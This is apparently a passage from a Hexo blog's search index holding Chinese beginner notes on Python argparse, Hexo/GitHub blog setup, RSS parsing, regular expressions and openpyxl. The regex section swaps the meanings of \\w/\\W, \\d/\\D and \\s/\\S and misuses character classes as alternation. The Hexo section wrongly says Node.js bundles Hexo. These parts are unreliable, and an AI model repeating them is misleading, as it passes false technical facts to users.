description-在参数帮助文档之前显示的文本（默认无）</span></span><br><span class="line"><span class="comment"># epilog-在参数帮助文档之后显示的文档（默认无）</span></span><br><span class="line"><span class="comment"># parents-一个ArgumentParser对象的列表，他们的参数也应包含在内</span></span><br><span class="line"><span class="comment"># formatter_class-用于自定义帮助文档输出格式的类</span></span><br><span class="line"><span class="comment"># prefix_chars-可选参数的前缀字符集合（默认值：&#x27;-&#x27;）</span></span><br><span class="line"><span class="comment"># fromfile_prefix_chars-当需要从文件中读取其他参数时，用于标识文件名的前缀字符集合（默认值：None）</span></span><br><span class="line"><span class="comment"># argument_default-参数的全局默认值（默认值：None）</span></span><br><span class="line"><span class="comment"># conflict_handler-解决冲突选项的策略（通常时不必要的）</span></span><br><span class="line"><span class="comment"># add_help-为解析器添加一个 -h/--help选项（默认值：True）</span></span><br><span class="line"><span class="comment"># allow_abbrev-如果缩写是无歧义的，则允许缩写长选项（默认值：True）</span></span><br><span class="line"><span class="comment"># exit_on_error-决定当错误发生时是否让ArgumentParser附带错误信息推出（默认值：True）’</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add_arguments()方法</span></span><br><span class="line"><span class="comment"># ArgumentParser.add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest])</span></span><br><span class="line"><span class="comment"># 定义单个的命令行参数应当如何解析：</span></span><br><span class="line"><span class="comment"># name or flags-一个命名或者一个选项字符串的列表，例如foo或-f,--foo</span></span><br><span class="line"><span class="comment"># action-当参数在命令行中出现时使用的动作基本类型</span></span><br><span class="line"><span class="comment"># nargs-命令行参数应当消耗的数目</span></span><br><span class="line"><span class="comment"># const-被一些action和nrgs选择所需求的常熟</span></span><br><span class="line"><span class="comment"># default-当参数未在命令行中出现并且也不存在于命名空间对象时所产生的值</span></span><br><span class="line"><span class="comment"># type-命令行参数应当被转换成的类型</span></span><br><span class="line"><span class="comment"># choices-可用参数的容器</span></span><br><span class="line"><span class="comment"># required-此命令行选项是否可忽略（仅选项可用）</span></span><br><span class="line"><span class="comment"># help-一个此选项作用的简单描述</span></span><br><span class="line"><span class="comment"># metavar-在使用方法消息中使用的参数示例</span></span><br><span class="line"><span class="comment"># dest-被添加到parse_args()所返回对象上的属性名</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--foo&#x27;</span>, action=<span class="string">&#x27;store_const&#x27;</span>, const=<span class="number">42</span>)</span><br><span class="line">parser.parse_args([<span class="string">&#x27;--foo&#x27;</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python argarim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo搭建github博客&amp;踩坑记录</title>
      <link href="/2021/04/13/hexo%E6%90%AD%E5%BB%BAgithub%E5%8D%9A%E5%AE%A2-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/04/13/hexo%E6%90%AD%E5%BB%BAgithub%E5%8D%9A%E5%AE%A2-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="搭建自己的github博客"><a href="#搭建自己的github博客" class="headerlink" title="搭建自己的github博客"></a>搭建自己的github博客</h2><p>之前用github搭建博客，用的是github自带的主题，样式太过单一，所以想换主题，折腾了两天，终于搭建成功，故在此记录。先去Baidu搜罗一个自己喜欢的hexo主题备用</p><h3 id="注册并申请github账号"><a href="#注册并申请github账号" class="headerlink" title="注册并申请github账号"></a>注册并申请github账号</h3><ul><li><p>   <a href="https://github.com/join?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=/&source=header-home">注册</a>一个github账号</p></li><li><p>   注册完成后登录，登录后点击new repository<br><a data-fancybox="gallery" data-src="/images/新建资料库-1.png" data-caption="142571649d46eb0674a0726e862deda0.png"><img src="/images/%E6%96%B0%E5%BB%BA%E8%B5%84%E6%96%99%E5%BA%93-1.png" alt="142571649d46eb0674a0726e862deda0.png"></a></p></li><li><p>   创建<br><a data-fancybox="gallery" data-src="/images/新建资料库-2.png" data-caption="772fa216880e5a87a5b3b9232bcfcc78.png"><img src="/images/%E6%96%B0%E5%BB%BA%E8%B5%84%E6%96%99%E5%BA%93-2.png" alt="772fa216880e5a87a5b3b9232bcfcc78.png"></a></p></li><li><p>  创建完成后放着备用。</p><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>官网<a href="https://nodejs.org/en/">下载</a>node.js安装，其中自动集成了hexo。下载完成后，新建空文件夹，进行hexo初始化，hexo将会在指定文件夹中新建所需要的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;新建文件夹&gt;</span><br><span class="line">cd &lt;新建文件夹&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>初始化完成后，新建文件夹中的目录如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source|   </span><br><span class="line">            ├── _drafts</span><br><span class="line">            ├── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><h4 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h4><h5 id="博客搭建-1"><a href="#博客搭建-1" class="headerlink" title="博客搭建"></a>博客搭建</h5><p>如果自己找的主题readme中有教程，接下来步骤可根据教程操作，以下为个人记录。</p></li><li><p>首先，把选好备用的主题clone到新建文件夹中/theams/路径下：git clone <a href="https://xxxxxxx/xxx">https://xxxxxxx/xxx</a> theams/主题名（可自定义）</p></li><li><p>修改/新建文件文件夹/_config.yml中的theme: landscape为theam: 主题名。注意：此处的主题名应该于路径theams路径下的主题名相同。</p></li><li><p> 在/新建文件文件夹/_config.yml中添加依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/xxx/xxx.github.io</span><br><span class="line">  # example, https://github.com/hexojs/hexojs.github.io</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure></li><li><p> 执行以下命令，将博客推到github上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save   *安装依赖</span><br><span class="line">hexo clean         *清除缓存</span><br><span class="line">hexo generate    *生成静态网页</span><br><span class="line">hexo deploy       *推送</span><br></pre></td></tr></table></figure></li><li><p>  完成后访问<a href="https://xxx.github.io即可/">https://xxx.github.io即可</a></p><h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new page about</span><br><span class="line">使用hexo new [layout] &lt;title&gt;命令创建页面和文章。例如，要创建“关于我”页面</span><br><span class="line">hexo new post &quot;hello world&quot; *创建新文章</span><br></pre></td></tr></table></figure><p>创建完文章后，依次执行命令hexo generate;hexo deploy即可上传文章成功<br>详细命令参见：<a href="https://hexo.io/zh-cn/docs/commands">hexo</a></p><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2></li></ul><ol><li>想要自定义主题的样式，不可直接在响应的html里面修改，需要到/新建文件夹/theames/主题名/_config.yml中修改。</li><li>如果直接修改html里面的样式则会在运行hexo generate时打回原型</li><li>修改页面详细配置，可到/新建文件夹/themes/主题名/languages/*.yml中修改</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 博客搭建 hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSS简介和知识储备</title>
      <link href="/2021/04/12/RSS%E7%AE%80%E4%BB%8B%E5%92%8C%E7%9F%A5%E8%AF%86%E5%82%A8%E5%A4%87/"/>
      <url>/2021/04/12/RSS%E7%AE%80%E4%BB%8B%E5%92%8C%E7%9F%A5%E8%AF%86%E5%82%A8%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h2 id="rss简介"><a href="#rss简介" class="headerlink" title="rss简介"></a>rss简介</h2><p>rss（简易信息聚合），是一种消息来源格式规范，用以聚合经常发布数据的网站，例如博客文章、新闻、音频或视频的网摘，（个人理解一个网站就相当于一个rss订阅）。RSS文件（或称作摘要，网络摘要，或频更新，提供到频道）包含全文或是节录的文字，再加上发用者所订阅之网摘布数据和输欧群的元数据。通常在时效性比较强的内容上使用RSS订阅能更快获取信息，网站提供RSS输出，有利于让用户获取网站内同的最新更新，网络用户可以在客户端借助于支持RSS的聚合工具软件，在不打开网站内容页面的情况下阅读支持RSS输出的网站内容。</p><h2 id="rss解析主体代码"><a href="#rss解析主体代码" class="headerlink" title="rss解析主体代码"></a>rss解析主体代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">网站种子解析</span><br><span class="line"><span class="keyword">import</span> feedparser</span><br><span class="line"><span class="comment"># feedparser是一个python的feed解析库</span></span><br><span class="line"><span class="comment"># 可以处理rss，CDF，Atom，使用他</span></span><br><span class="line"><span class="comment"># 可以从任何RSS或者Atom中得到标题，链接和文章条目</span></span><br><span class="line">rss_oschina = feedparser.parse(url[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># 输出channel里面的title</span></span><br><span class="line">pprint.pprint(rss_oschina.feed.title)</span><br><span class="line"><span class="comment"># 整理为json数组</span></span><br><span class="line">mylist = [&#123;<span class="string">&#x27;title&#x27;</span>: entry[<span class="string">&#x27;title&#x27;</span>], <span class="string">&#x27;link&#x27;</span>: entry[<span class="string">&#x27;link&#x27;</span>]&#125; <span class="keyword">for</span> entry <span class="keyword">in</span> rss_oschina[<span class="string">&#x27;entries&#x27;</span>]]</span><br><span class="line"><span class="comment">#  判断channel里面的title是否存在，返回bool型的数值</span></span><br><span class="line"><span class="keyword">if</span> rss_oschina.feed.__contains__(<span class="string">&#x27;title&#x27;</span>):</span><br><span class="line">    title = rss_oschina.feed.title</span><br><span class="line">    pprint.pprint(title)</span><br></pre></td></tr></table></figure><h2 id="参考链接如下："><a href="#参考链接如下：" class="headerlink" title="参考链接如下："></a>参考链接如下：</h2><ul><li>  <a href="https://blog.csdn.net/qq_24185239/article/details/80977556">python学习——print和pprint两者的区别</a></li><li>  <a href="https://blog.csdn.net/qq_38013157/article/details/105896503">python实现RSS解析</a></li><li>  <a href="https://www.runoob.com/rss/rss-tutorial.html">菜鸟教程</a></li><li>  <a href="https://blog.csdn.net/qq_34243930/article/details/86777720">Python解析RSS（feedparser安装与使用）</a></li><li>  <a href="https://www.cnblogs.com/bbn0111/p/7056366.html">Python之feedparser</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> rss python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2021/04/12/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2021/04/12/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="一、正则表达式函数"><a href="#一、正则表达式函数" class="headerlink" title="一、正则表达式函数"></a>一、正则表达式函数</h2><p>match 这个函数是从头开始匹配且只能从头开始匹配<br>search 这个函数是可以从任意位置开始匹配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string = <span class="string">&quot;poythonypnyhjptyskphyjsa&quot;</span></span><br></pre></td></tr></table></figure><h3 id="1-match函数"><a href="#1-match函数" class="headerlink" title="1.match函数"></a>1.match函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pat = <span class="string">&quot;p.*?y&quot;</span>      <span class="comment"># .*?y 是一个整体，代表懒惰模式运行（精准，用的比较多），匹配到第一个y为止</span></span><br><span class="line"><span class="comment"># pat = &quot;o.*?y&quot;  # 不能正确匹配  因为match是从头开始匹配的意思</span></span><br><span class="line"><span class="comment"># result = re.match(pat,string,re.I)</span></span><br><span class="line"><span class="comment"># result = re.search(pat,string,re.I)</span></span><br></pre></td></tr></table></figure><h3 id="2-全局函数"><a href="#2-全局函数" class="headerlink" title="2.全局函数"></a>2.全局函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 格式：re.compile（正则表达式）.findall(数据/字符串)</span></span><br><span class="line"><span class="comment"># compile（先编译一下）</span></span><br><span class="line"><span class="comment"># result = re.compile(pat).findall(string)</span></span><br><span class="line"><span class="comment"># print (result)</span></span><br></pre></td></tr></table></figure><h3 id="3-sub函数"><a href="#3-sub函数" class="headerlink" title="3.sub函数"></a>3.sub函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把全局格式匹配出来的所有符合格式的替换成规定的字符串</span></span><br><span class="line">result = re.sub(pat,<span class="string">&quot;123&quot;</span>,string)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="二、正则表达式模式修正符"><a href="#二、正则表达式模式修正符" class="headerlink" title="二、正则表达式模式修正符"></a>二、正则表达式模式修正符</h2><p>在不改变正则表达式的情况下，通过模式修正符改变正则表达式的含义，<br>从而实现一些匹配结果的调整等功能</p><blockquote><p>I   匹配的时候忽略大小写</p><p>M   多行匹配</p><p>L   本地化识别匹配</p><p>U   根据unicode字符进行解析</p><p>S   让.匹配包括换行符</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string = <span class="string">&quot;Python&quot;</span></span><br><span class="line">pat = <span class="string">&quot;pyt&quot;</span></span><br><span class="line"><span class="comment"># re.I  自动忽略大小写</span></span><br><span class="line">result = re.search(pat,string,re.I)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="三、元字符"><a href="#三、元字符" class="headerlink" title="三、元字符"></a>三、元字符</h2><p>元字符就是正则表达式中具有一些特殊含义的字符，比如重复N次的前面的字符<br>常用的元字符有以下几种：</p><blockquote><p>.   匹配除换行符以外的任意一个字符</p><p>^   这个符号如果不在原子表里面，匹配开始的位置<br>$   匹配结束位置</p><ul><li>代表的是前面的原子重复出现0次，1次或多次<br>  ?   代表的是前面的原子重复出现0次，1次</li></ul><ul><li>代表的是前面的原子重复出现1次或多次<br>  {n}  代表的是前面的原子恰好出现n次<br>  {n,}  代表的是前面的原子至少出现n次<br>  {n，m} 代表的是前面的原子至少出现n次,至多出现m次<br>  |   模式选择符或<br>  ()  模式单元</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string = <span class="string">&quot;&quot;&quot;&lt;a target=&quot;_blank&quot; href=&quot;https://www.ikwoonleefzorg.nl&quot;&gt;&quot;&quot;&quot;</span></span><br><span class="line">pat = <span class="string">&quot;&quot;&quot;&lt;a target=&quot;_blank&quot; href=&quot;(http.*?)&quot;&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># string = &quot;&quot;&quot;woshixiaokeai7891234hahuhayou&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># pat = &quot;h[^abc]you&quot;  加上这个&quot;^&quot;符号之后，意思就是除了abc这三个元素其他的都可以匹配</span></span><br><span class="line"><span class="comment"># pat = &quot;h.you&quot;   #匹配两个数字</span></span><br><span class="line">result = re.findall(pat,string)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="四、正则表达式"><a href="#四、正则表达式" class="headerlink" title="四、正则表达式"></a>四、正则表达式</h2><p>正则表达式专用模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string = <span class="string">&quot;woshixiaokeai&quot;</span></span><br></pre></td></tr></table></figure><h3 id="1、普通字符作为原子"><a href="#1、普通字符作为原子" class="headerlink" title="1、普通字符作为原子"></a>1、普通字符作为原子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pat = <span class="string">&quot;keai&quot;</span></span><br><span class="line"><span class="comment"># re.search(正则表达式内容，字符串内容) 用于检索字符串</span></span><br><span class="line">result = re. search(pat,string)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="2、非打印字符作为原子"><a href="#2、非打印字符作为原子" class="headerlink" title="2、非打印字符作为原子"></a>2、非打印字符作为原子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（指的是不是输出出来的东西，类似于<span class="string">&#x27;\n&#x27;</span>（换行符），<span class="string">&#x27;\t&#x27;</span>(制表符之类的)）</span><br><span class="line">string2 = <span class="string">&quot;&quot;&quot;woshixiaokeai</span></span><br><span class="line"><span class="string">baidu</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">pat = <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">result = re.search(pat,string2)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="3、通用字符作为原子"><a href="#3、通用字符作为原子" class="headerlink" title="3、通用字符作为原子"></a>3、通用字符作为原子</h3><p>也就是说用一个字符代替一类东西，只要出现在这一类东西都能匹配出来<br>常用的有一下几个：</p><blockquote><p>\W 匹配一个任意字母、数字、或者下划线<br>\w 匹配除了字母数字下划线以外的任意一个字符<br>\D 匹配任意一个十进制数<br>\d 除十进制数以外的任意一个字符<br>\s 匹配除空白字符以外的任意一个字符<br>\S 匹配空白字符</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;&quot;&quot;woshixiaokeai 7891234hahu hayou&quot;&quot;&quot;</span></span><br><span class="line">pat = <span class="string">&quot;\s\w\d\d&quot;</span>   <span class="comment">#匹配两个数字</span></span><br><span class="line">result = re.search(pat,string)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">string = <span class="string">&quot;&quot;&quot;woshixiaokeai 7891234hahu hayou&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="4、原子表"><a href="#4、原子表" class="headerlink" title="4、原子表"></a>4、原子表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">像[xyz]这样的，然后从中任意提取一个原子 出来</span><br><span class="line">string = <span class="string">&quot;&quot;&quot;woshixiaokeai7891234hahuhayou&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># pat = &quot;h[^abc]you&quot;  加上这个&quot;^&quot;符号之后，意思就是除了abc这三个元素其他的都可以匹配</span></span><br><span class="line">pat = <span class="string">&quot;h[abc]you&quot;</span>   <span class="comment">#匹配两个数字</span></span><br><span class="line">result = re.search(pat,string)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="五、正则表达式实例讲解"><a href="#五、正则表达式实例讲解" class="headerlink" title="五、正则表达式实例讲解"></a>五、正则表达式实例讲解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># 如何匹配 .com/.cn等的网址，以及如何匹配电话号码</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string = <span class="string">&quot;&lt;a href=&#x27;http://www.baidu.com&#x27;&gt;百度首页&lt;/a&gt;&quot;</span></span><br><span class="line">pat = <span class="string">&quot;[a-zA-Z]+://[^\s]*[.com|.cn]&quot;</span></span><br><span class="line">rst = re.<span class="built_in">compile</span>(pat).findall(string)</span><br><span class="line"><span class="comment"># rst = re.findall(pat,string)</span></span><br><span class="line"><span class="built_in">print</span>(rst)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配电话号码</span></span><br><span class="line"><span class="comment"># pat = &quot;\d&#123;4&#125;-\d&#123;7&#125;|\d&#123;3&#125;-\d&#123;8&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rst = re.findall(pat,string)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爬取域名</span></span><br><span class="line">string = <span class="string">&#x27;&lt;a href=&quot;//kailaili.com&#x27;</span></span><br><span class="line"><span class="comment"># &lt;a target=&quot;_blank&quot; href=&quot;(http.*?)&quot;&gt;</span></span><br><span class="line">pat = <span class="string">&quot;//[^\s]*&quot;</span></span><br><span class="line">rst = re.findall(pat, string)</span><br><span class="line"><span class="built_in">print</span>(rst)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取ip</span></span><br><span class="line">string = <span class="string">&#x27;&lt;/a&gt;&lt;a href=&quot;http://149.202.171.21:9002&quot; &gt;&#x27;</span></span><br><span class="line">pat = <span class="string">&#x27;&lt;/a&gt;&lt;a href=&quot;([http|https]+://[^\s]*)&#x27;</span></span><br><span class="line">rst = re.findall(pat, string)</span><br><span class="line"><span class="built_in">print</span>(rst)</span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;http://149.202.171.21:9002&quot;</span></span><br><span class="line">pat = <span class="string">&#x27;[http|https]+://([^\s]*):&#x27;</span></span><br><span class="line">pat2 = <span class="string">&#x27;[0-9]:([^\s]*)&#x27;</span></span><br><span class="line">rst = re.findall(pat, string)</span><br><span class="line">rst2 = re.findall(pat2, string)</span><br><span class="line"><span class="built_in">print</span>(rst[<span class="number">0</span>],rst2[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;http://149.202.171.21:9002&quot;</span></span><br><span class="line">pat = <span class="string">&#x27;[http|https]+://([^\s]*)&#x27;</span></span><br><span class="line"><span class="comment"># pat2 = &#x27;[0-9]:([^\s]*)&#x27;</span></span><br><span class="line">rst = re.findall(pat, string)</span><br><span class="line"><span class="comment"># rst2 = re.findall(pat2, string)</span></span><br><span class="line"><span class="built_in">print</span>(rst[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据写入excel表格</title>
      <link href="/2021/04/12/%E6%95%B0%E6%8D%AE%E5%86%99%E5%85%A5excel%E8%A1%A8%E6%A0%BC/"/>
      <url>/2021/04/12/%E6%95%B0%E6%8D%AE%E5%86%99%E5%85%A5excel%E8%A1%A8%E6%A0%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="1、创建文件"><a href="#1、创建文件" class="headerlink" title="1、创建文件"></a>1、创建文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line">wb = Workbook()</span><br><span class="line"><span class="comment"># 获取当前actice的sheet</span></span><br><span class="line">ws = wb.active</span><br><span class="line">ws.title = <span class="string">&quot;salary&quot;</span></span><br><span class="line">wb.save(<span class="string">&quot;文件名&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="2、打开已有文件"><a href="#2、打开已有文件" class="headerlink" title="2、打开已有文件"></a>2、打开已有文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> load_workbook</span><br><span class="line">wb = load_workbook(<span class="string">&#x27;文件名&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="3、获取目前最大行数、列数"><a href="#3、获取目前最大行数、列数" class="headerlink" title="3、获取目前最大行数、列数"></a>3、获取目前最大行数、列数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 最大列</span></span><br><span class="line">ws.max_col</span><br><span class="line"><span class="comment"># 最大行</span></span><br><span class="line">ws.max_row</span><br></pre></td></tr></table></figure><h2 id="4、写入数据"><a href="#4、写入数据" class="headerlink" title="4、写入数据"></a>4、写入数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws.cell(row,col,calue)</span><br></pre></td></tr></table></figure><h2 id="5、按行遍历"><a href="#5、按行遍历" class="headerlink" title="5、按行遍历"></a>5、按行遍历</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一种方法，按行遍历每一个单元格的值</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> ws:      <span class="comment"># 循环获取表数据</span></span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> row:   <span class="comment">#循环获取每个单元格数据</span></span><br><span class="line">        <span class="built_in">print</span>(cell.value,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 第二种方法，遍历指定的行和列</span></span><br><span class="line"><span class="comment">#遍历第2行到第5行的前10列</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> ws.iter_rows(min_row=<span class="number">2</span>, max_row=<span class="number">5</span>, max_col=<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> row:</span><br><span class="line">        <span class="built_in">print</span>(cell.value, end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h2 id="6、按列遍历"><a href="#6、按列遍历" class="headerlink" title="6、按列遍历"></a>6、按列遍历</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 遍历顺序，大概就像是A1,A2,A3这样的顺序</span></span><br><span class="line"><span class="keyword">for</span> column <span class="keyword">in</span> sheet.columns:</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> column:</span><br><span class="line">        <span class="built_in">print</span>(cell.value, end=<span class="string">&quot;,&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python openpyxl </tag>
            
        </tags>
      
    </entry>
